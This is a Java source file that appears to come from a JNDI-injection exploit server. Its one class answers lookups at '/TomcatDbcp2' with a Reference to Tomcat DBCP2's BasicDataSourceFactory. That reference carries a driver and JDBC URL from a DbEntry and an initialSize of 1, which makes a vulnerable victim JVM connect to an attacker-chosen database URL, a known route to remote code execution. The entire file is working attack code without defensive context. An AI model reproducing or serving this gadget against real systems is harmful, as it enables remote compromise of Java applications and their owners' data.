package com.example.exploit.controller;

import com.example.exploit.annotation.JNDIController;
import com.example.exploit.annotation.JNDIMapping;
import com.example.exploit.entity.DbEntry;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/TomcatDbcp2")
public class TomcatDbcp2Controller extends DatabaseController {
    public Object service(DbEntry dbEntry) {
        Reference ref = new Reference("javax.sql.DataSource", "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", dbEntry.getDriver()));
        ref.add(new StringRefAddr("url", dbEntry.getUrl()));
        ref.add(new StringRefAddr("initialSize","1"));

        System.out.println("TomcatDbcp2");
        return ref;
    }
}
